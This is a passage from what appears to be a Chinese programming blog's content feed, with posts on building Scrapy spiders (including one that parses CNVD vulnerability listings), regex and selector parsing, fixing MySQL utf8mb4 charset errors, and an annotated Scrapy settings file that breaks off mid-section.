class="line">        risk = re.findall(<span class="string">&#x27;&lt;tr&gt;\s+&lt;td class=&quot;alignRight&quot;&gt;危害级别&lt;/td&gt;.*?&lt;/span&gt;(.*?)&lt;/tr&gt;&#x27;</span>, table, re.S)</span><br><span class="line">        vuln[<span class="string">&#x27;risk&#x27;</span>] = remove_tags(risk[<span class="number">0</span>]).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">if</span> risk != [] <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        vuln[<span class="string">&#x27;platform&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        vuln[<span class="string">&#x27;category&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        vuln[<span class="string">&#x27;src&#x27;</span>] = <span class="string">&#x27;CNVD&#x27;</span></span><br><span class="line">        post_date = re.findall(<span class="string">&#x27;&lt;tr &gt;\s+&lt;td class=&quot;alignRight&quot;&gt;公开日期&lt;/td&gt;\s+&lt;td&gt;\s+(.*?)\s+&lt;/td&gt;\s+&lt;/tr&gt;&#x27;</span>, table, re.S)</span><br><span class="line">        vuln[<span class="string">&#x27;post_date&#x27;</span>] = post_date[<span class="number">0</span>] <span class="keyword">if</span> post_date != [] <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        vuln_desc = re.findall(<span class="string">&#x27;&lt;tr&gt;\s+&lt;td class=&quot;alignRight&quot;&gt;漏洞描述&lt;/td&gt;(.*?)&lt;/tr&gt;&#x27;</span>, table, re.S)</span><br><span class="line">        vuln[<span class="string">&#x27;vuln_desc&#x27;</span>] = remove_tags(replace_wrap(vuln_desc[<span class="number">0</span>]))</span><br><span class="line">        vuln[<span class="string">&#x27;code&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        vuln[<span class="string">&#x27;crawl_time&#x27;</span>] = datetime.datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line">        print(vuln[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        <span class="keyword">yield</span> vuln</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="1-设置headers"><a href="#1-设置headers" class="headerlink" title="1.设置headers"></a>1.设置headers</h4><p>由于如果更改settings里的headers，当前项目全部的爬虫都会使用该头。所以对于单个具有反爬机制的爬虫，采用在爬虫中修改headers的办法。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">headers_list = &#123;</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>:<span class="string">&#x27;https://www.cnvd.org.cn/flaw/list.htm&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>:<span class="string">&#x27;www.cnvd.org.cn&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User_Agents&#x27;</span>:<span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;Origin&#x27;</span>:<span class="string">&#x27;https://www.cnvd.org.cn&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">headers_content = &#123;</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://www.cnvd.org.cn/flaw/list.htm?flag=true&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.cnvd.org.cn&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User_Agents&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;https://www.cnvd.org.cn&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序中设置了爬取列表和内容分别使用的头部，分别在解析的parse中使用。</p><h4 id="2-自定义设置"><a href="#2-自定义设置" class="headerlink" title="2.自定义设置"></a>2.自定义设置</h4><p>settings中一些常用设置，如 DOWNLOAD_DELAY、ROBOTSTXT_OBEY、CONCURRENT_REQUESTS_PER_DOMAIN等，如果直接在settings定义，也会影响全部爬虫，故在单个爬虫中定义custom_settings。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 对于单个爬虫，自定义设置</span></span><br><span class="line">custom_settings = &#123;</span><br><span class="line">    <span class="string">&#x27;DOWNLOAD_DELAY&#x27;</span> : <span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ROBOTSTXT_OBEY&#x27;</span> : <span class="string">&#x27;False&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;CONCURRENT_REQUESTS_PER_DOMAIN&#x27;</span>:<span class="string">&#x27;5&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Scrapy爬虫入门（三） 解析提取数据</title>
      <link href="2020/03/31/2020-03-31-scrapy_spiders_3_parsing_extracte_data/"/>
      <url>2020/03/31/2020-03-31-scrapy_spiders_3_parsing_extracte_data/</url>
      
        <content type="html"><![CDATA[<h1 id="Scrapy爬虫入门（三）-解析提取数据"><a href="#Scrapy爬虫入门（三）-解析提取数据" class="headerlink" title="Scrapy爬虫入门（三） 解析提取数据"></a>Scrapy爬虫入门（三） 解析提取数据</h1><p>爬取过程中，会遇到很多解析问题，如何快速、灵活、正确地提取出想要的元素，并且要求一定的容错率，是爬虫最重要的工作之一，也具有一定的难度。</p><p>从页面中提取数据的核心技术是HTTP文本解析，在Python中常用以下模块来处理：</p><ul><li><p>BeautifulSoup</p><p>BeautifulSoup是非常流行的HTTP解析库，API简洁易用，但解析速度较慢。</p></li><li><p>lxml</p><p>lxml是一套由C语言编写的xml解析库，解析速度更快，API相对复杂。</p></li></ul><p>scrapy综合上述两者的有点实现了Selecter类，在scrapy中使用Selector对象提取页面中的数据，使用时先通过XPATH或CSS选择器选中页面中要提取的数据，然后进行提取。</p><p>Selector类的实现位于scrapy.selector模块,创建Selector对象时,可将页面的HTML文档字符串传递给Selector构造器方法的text参数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from scrapy.selector import Selector</span><br><span class="line">html&#x3D;&#39;&#39;&#39;</span><br><span class="line">...</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">selector &#x3D; Selector(text&#x3D;text)</span><br></pre></td></tr></table></figure><p>然后调用Selector对象的xpath方法或css方法(传入XPath或CSS选择器表达式)。一般浏览器F12选择位置可以复制xpath或CSS路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">selector.xpath()</span><br><span class="line">selector.css()</span><br></pre></td></tr></table></figure><p>提取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">● extract()</span><br><span class="line">● re()</span><br><span class="line">● extract_first() (SelectorList专有)</span><br><span class="line">● re_first() (SelectorList专有)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424004253.png" alt="image-20200331090241898"></p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200424004305.png" alt="image-20200331090404544"></p><p>学会了scrapy的selector，xpath以及css解析，还需要了解正则解析，其中常用的就是python的re库。正则解析速度较快，但缺点是规则难写，改动困难。</p><table><thead><tr><th align="left">模式</th><th>描述</th></tr></thead><tbody><tr><td align="left">^</td><td>匹配字符串的开头</td></tr><tr><td align="left">$</td><td>匹配字符串的末尾。</td></tr><tr><td align="left">.</td><td>匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。</td></tr><tr><td align="left">[…]</td><td>用来表示一组字符,单独列出：[amk] 匹配 ‘a’，’m’或’k’</td></tr><tr><td align="left">[^…]</td><td>不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。</td></tr><tr><td align="left">re*</td><td>匹配0个或多个的表达式。</td></tr><tr><td align="left">re+</td><td>匹配1个或多个的表达式。</td></tr><tr><td align="left">re?</td><td>匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式</td></tr><tr><td align="left">re{ n}</td><td>精确匹配 n 个前面表达式。例如， o{2} 不能匹配 “Bob” 中的 “o”，但是能匹配  “food” 中的两个 o。</td></tr><tr><td align="left">re{ n,}</td><td>匹配 n 个前面表达式。例如， o{2,} 不能匹配”Bob”中的”o”，但能匹配 “foooood”中的所有 o。”o{1,}” 等价于  “o+”。”o{0,}” 则等价于 “o*”。</td></tr><tr><td align="left">re{ n, m}</td><td>匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式</td></tr><tr><td align="left">a| b</td><td>匹配a或b</td></tr><tr><td align="left">(re)</td><td>对正则表达式分组并记住匹配的文本</td></tr><tr><td align="left">(?imx)</td><td>正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。</td></tr><tr><td align="left">(?-imx)</td><td>正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。</td></tr><tr><td align="left">(?: re)</td><td>类似 (…), 但是不表示一个组</td></tr><tr><td align="left">(?imx: re)</td><td>在括号中使用i, m, 或 x 可选标志</td></tr><tr><td align="left">(?-imx: re)</td><td>在括号中不使用i, m, 或 x 可选标志</td></tr><tr><td align="left">(?#…)</td><td>注释.</td></tr><tr><td align="left">(?= re)</td><td>前向肯定界定符。如果所含正则表达式，以 …  表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。</td></tr><tr><td align="left">(?! re)</td><td>前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功</td></tr><tr><td align="left">(?&gt; re)</td><td>匹配的独立模式，省去回溯。</td></tr><tr><td align="left">\w</td><td>匹配字母数字及下划线</td></tr><tr><td align="left">\W</td><td>匹配非字母数字及下划线</td></tr><tr><td align="left">\s</td><td>匹配任意空白字符，等价于 [\t\n\r\f].</td></tr><tr><td align="left">\S</td><td>匹配任意非空字符</td></tr><tr><td align="left">\d</td><td>匹配任意数字，等价于 [0-9].</td></tr><tr><td align="left">\D</td><td>匹配任意非数字</td></tr><tr><td align="left">\A</td><td>匹配字符串开始</td></tr><tr><td align="left">\Z</td><td>匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。</td></tr><tr><td align="left">\z</td><td>匹配字符串结束</td></tr><tr><td align="left">\G</td><td>匹配最后匹配完成的位置。</td></tr><tr><td align="left">\b</td><td>匹配一个单词边界，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配”never” 中的 ‘er’，但不能匹配 “verb” 中的  ‘er’。</td></tr><tr><td align="left">\B</td><td>匹配非单词边界。’er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。</td></tr><tr><td align="left">\n, \t, 等.</td><td>匹配一个换行符。匹配一个制表符。等</td></tr><tr><td align="left">\1…\9</td><td>匹配第n个分组的内容。</td></tr><tr><td align="left">\10</td><td>匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。</td></tr></tbody></table><p>方法有：search()、match()、findall()、compile()等</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql [Error 1366错误] Incorrect string value 如何修改数据库字符集</title>
      <link href="2020/03/30/2020-03-30-mysql_Error_1366_Incorrect_string_value/"/>
      <url>2020/03/30/2020-03-30-mysql_Error_1366_Incorrect_string_value/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql-Error-1366错误-Incorrect-string-value"><a href="#mysql-Error-1366错误-Incorrect-string-value" class="headerlink" title="mysql [Error 1366错误] Incorrect string value"></a>mysql [Error 1366错误] Incorrect string value</h1><p>Error 1366 错误:Incorrect string value即操作Mysql数据库无法插入Emoji表情的问题。</p><p>主要问题是字符集编码设置与要插入的内容不对应。</p><p>字符集编码存在于两个地方：</p><ul><li><strong>数据库</strong></li><li><strong>代码（连接数据库的驱动）</strong></li></ul><p>大多数人都仅仅关注到了数据库层面的编码，忘记了用代码连接数据库时也需要指定字符集编码。</p><h4 id="一、代码（连接数据库的驱动）"><a href="#一、代码（连接数据库的驱动）" class="headerlink" title="一、代码（连接数据库的驱动）"></a>一、代码（连接数据库的驱动）</h4><p>无论是用Java、Python、Go或者其他高级语言，如果想要操作数据库都需要数据库驱动。然后就会有一些配置，例如python。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pymysql.connect(host&#x3D;&quot;localhost&quot;, user&#x3D;&quot;root&quot;, passwd&#x3D;&quot;123456&quot;, db&#x3D;&quot;test_db&quot;, charset&#x3D;&quot;utf8&quot;)</span><br></pre></td></tr></table></figure><p>我们经常会在最后设置成utf8，而且常常忽略这一点，这就导致无法使用代码插入emoji表情！修改为utf8mb4即可。</p><h4 id="二、数据库"><a href="#二、数据库" class="headerlink" title="二、数据库"></a>二、数据库</h4><p>这一点网上有很多教程，总的来说，数据库编码有四个层级。</p><ul><li>数据库服务器</li><li>库</li><li>表</li><li>字段</li></ul><p>1、数据库服务器修改编码需要去my.ini配置文件修改</p><p>在my.ini中有一句配置，default-character-set=utf8，将其修改为default-character-set=utf8mb4并保存。修改完配置之后，就需要重启Mysql服务器。</p><p>2、库</p><p>可以使用Navicat，右键库名，选择编辑数据库，也可以使用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter database 库名 default character set 字符集;</span><br></pre></td></tr></table></figure><p>3、表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 convert to character set 字符集;</span><br></pre></td></tr></table></figure><p>4、字段</p><p>字段可以在Navicat中右键表-设计表，也可以使用命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 modify 字段名 字段属性 character set 字符集；</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scrapy读取配置文件setting.py中内容</title>
      <link href="2020/03/30/2020-03-30-scrapy_reads_content_in_configfile_setting_py/"/>
      <url>2020/03/30/2020-03-30-scrapy_reads_content_in_configfile_setting_py/</url>
      
        <content type="html"><![CDATA[<h2 id="scrapy读取配置文件setting-py中内容"><a href="#scrapy读取配置文件setting-py中内容" class="headerlink" title="scrapy读取配置文件setting.py中内容"></a>scrapy读取配置文件setting.py中内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from scrapy.utils.project import get_project_settings</span><br><span class="line">settings &#x3D; get_project_settings()</span><br><span class="line"></span><br><span class="line">user_agents &#x3D; settings[&#39;USER_AGENTS&#39;]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scrapy同时启动多个爬虫</title>
      <link href="2020/03/29/2020-03-29-scrapy_start_multiple_crawlers_simultaneously/"/>
      <url>2020/03/29/2020-03-29-scrapy_start_multiple_crawlers_simultaneously/</url>
      
        <content type="html"><![CDATA[<h1 id="scrapy同时启动多个爬虫"><a href="#scrapy同时启动多个爬虫" class="headerlink" title="scrapy同时启动多个爬虫"></a>scrapy同时启动多个爬虫</h1><h4 id="（1）创建commands文件夹"><a href="#（1）创建commands文件夹" class="headerlink" title="（1）创建commands文件夹"></a>（1）创建commands文件夹</h4><p>首先在我们的项目里面创建一个commands文件夹，用来存放我们等下需要开启多爬虫同时启动的文件。</p><h4 id="（2）编写crawlall-py文件"><a href="#（2）编写crawlall-py文件" class="headerlink" title="（2）编写crawlall.py文件"></a>（2）编写crawlall.py文件</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.commands <span class="keyword">import</span> ScrapyCommand</span><br><span class="line"><span class="keyword">from</span> scrapy.utils.project <span class="keyword">import</span> get_project_settings</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Command</span>(<span class="params">ScrapyCommand</span>):</span></span><br><span class="line"> </span><br><span class="line">    requires_project = <span class="literal">True</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">syntax</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;[options]&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">short_desc</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Runs all of the spiders&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, args, opts</span>):</span></span><br><span class="line">        spider_list = self.crawler_process.spiders.<span class="built_in">list</span>()</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> spider_list:</span><br><span class="line">            self.crawler_process.crawl(name, **opts.__dict__)</span><br><span class="line">        self.crawler_process.start()</span><br></pre></td></tr></table></figure><h4 id="（3）settings-py配置文件修改"><a href="#（3）settings-py配置文件修改" class="headerlink" title="（3）settings.py配置文件修改"></a>（3）settings.py配置文件修改</h4><p>添加一条</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># COMMANDS_MODULE &#x3D; ‘项目名称.目录名称’</span><br><span class="line">COMMANDS_MODULE &#x3D; &#39;secnews_spiders.commands&#39;</span><br></pre></td></tr></table></figure><h4 id="（4）命令行执行"><a href="#（4）命令行执行" class="headerlink" title="（4）命令行执行"></a>（4）命令行执行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawlall</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scrapy配置文件settings</title>
      <link href="2020/03/28/2020-03-28-scrapy_configfile_settings/"/>
      <url>2020/03/28/2020-03-28-scrapy_configfile_settings/</url>
      
        <content type="html"><![CDATA[<h1 id="scrapy的配置文件settings"><a href="#scrapy的配置文件settings" class="headerlink" title="scrapy的配置文件settings"></a>scrapy的配置文件settings</h1><p>本文转自博客园-龙云飞谷：<a href="https://www.cnblogs.com/longyunfeigu/p/9494408.html">https://www.cnblogs.com/longyunfeigu/p/9494408.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">#&#x3D;&#x3D;&gt;第一部分：基本配置&lt;&#x3D;&#x3D;&#x3D;</span><br><span class="line">#1、项目名称，默认的USER_AGENT由它来构成，也作为日志记录的日志名</span><br><span class="line">BOT_NAME &#x3D; &#39;Amazon&#39;</span><br><span class="line"></span><br><span class="line">#2、爬虫应用路径</span><br><span class="line">SPIDER_MODULES &#x3D; [&#39;Amazon.spiders&#39;]</span><br><span class="line">NEWSPIDER_MODULE &#x3D; &#39;Amazon.spiders&#39;</span><br><span class="line"></span><br><span class="line">#3、客户端User-Agent请求头</span><br><span class="line">#USER_AGENT &#x3D; &#39;Amazon (+http:&#x2F;&#x2F;www.yourdomain.com)&#39;</span><br><span class="line"></span><br><span class="line">#4、是否遵循爬虫协议</span><br><span class="line"># Obey robots.txt rules</span><br><span class="line">ROBOTSTXT_OBEY &#x3D; False</span><br><span class="line"></span><br><span class="line">#5、是否支持cookie，cookiejar进行操作cookie，默认开启</span><br><span class="line">#COOKIES_ENABLED &#x3D; False</span><br><span class="line"></span><br><span class="line">#6、Telnet用于查看当前爬虫的信息，操作爬虫等...使用telnet ip port ，然后通过命令操作</span><br><span class="line">#TELNETCONSOLE_ENABLED &#x3D; False</span><br><span class="line">#TELNETCONSOLE_HOST &#x3D; &#39;127.0.0.1&#39;</span><br><span class="line">#TELNETCONSOLE_PORT &#x3D; [6023,]</span><br><span class="line"></span><br><span class="line">#7、Scrapy发送HTTP请求默认使用的请求头</span><br><span class="line">#DEFAULT_REQUEST_HEADERS &#x3D; &#123;</span><br><span class="line">#   &#39;Accept&#39;: &#39;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">#   &#39;Accept-Language&#39;: &#39;en&#39;,</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#&#x3D;&#x3D;&#x3D;&gt;第二部分：并发与延迟&lt;&#x3D;&#x3D;&#x3D;</span><br><span class="line">#1、下载器总共最大处理的并发请求数,默认值16</span><br><span class="line">#CONCURRENT_REQUESTS &#x3D; 32</span><br><span class="line"></span><br><span class="line">#2、每个域名能够被执行的最大并发请求数目，默认值8</span><br><span class="line">#CONCURRENT_REQUESTS_PER_DOMAIN &#x3D; 16</span><br><span class="line"></span><br><span class="line">#3、能够被单个IP处理的并发请求数，默认值0，代表无限制，需要注意两点</span><br><span class="line">#I、如果不为零，那CONCURRENT_REQUESTS_PER_DOMAIN将被忽略，即并发数的限制是按照每个IP来计算，而不是每个域名</span><br><span class="line">#II、该设置也影响DOWNLOAD_DELAY，如果该值不为零，那么DOWNLOAD_DELAY下载延迟是限制每个IP而不是每个域</span><br><span class="line">#CONCURRENT_REQUESTS_PER_IP &#x3D; 16</span><br><span class="line"></span><br><span class="line">#4、如果没有开启智能限速，这个值就代表一个规定死的值，代表对同一网址延迟请求的秒数</span><br><span class="line">#DOWNLOAD_DELAY &#x3D; 3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#&#x3D;&#x3D;&#x3D;&gt;第三部分：智能限速&#x2F;自动节流：AutoThrottle extension&lt;&#x3D;&#x3D;&#x3D;</span><br><span class="line">#一：介绍</span><br><span class="line">from scrapy.contrib.throttle import AutoThrottle #http:&#x2F;&#x2F;scrapy.readthedocs.io&#x2F;en&#x2F;latest&#x2F;topics&#x2F;autothrottle.html#topics-autothrottle</span><br><span class="line">设置目标：</span><br><span class="line">1、比使用默认的下载延迟对站点更好</span><br><span class="line">2、自动调整scrapy到最佳的爬取速度，所以用户无需自己调整下载延迟到最佳状态。用户只需要定义允许最大并发的请求，剩下的事情由该扩展组件自动完成</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#二：如何实现？</span><br><span class="line">在Scrapy中，下载延迟是通过计算建立TCP连接到接收到HTTP包头(header)之间的时间来测量的。</span><br><span class="line">注意，由于Scrapy可能在忙着处理spider的回调函数或者无法下载，因此在合作的多任务环境下准确测量这些延迟是十分苦难的。 不过，这些延迟仍然是对Scrapy(甚至是服务器)繁忙程度的合理测量，而这扩展就是以此为前提进行编写的。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#三：限速算法</span><br><span class="line">自动限速算法基于以下规则调整下载延迟</span><br><span class="line">#1、spiders开始时的下载延迟是基于AUTOTHROTTLE_START_DELAY的值</span><br><span class="line">#2、当收到一个response，对目标站点的下载延迟&#x3D;收到响应的延迟时间&#x2F;AUTOTHROTTLE_TARGET_CONCURRENCY</span><br><span class="line">#3、下一次请求的下载延迟就被设置成：对目标站点下载延迟时间和过去的下载延迟时间的平均值</span><br><span class="line">#4、没有达到200个response则不允许降低延迟</span><br><span class="line">#5、下载延迟不能变的比DOWNLOAD_DELAY更低或者比AUTOTHROTTLE_MAX_DELAY更高</span><br><span class="line"></span><br><span class="line">#四：配置使用</span><br><span class="line">#开启True，默认False</span><br><span 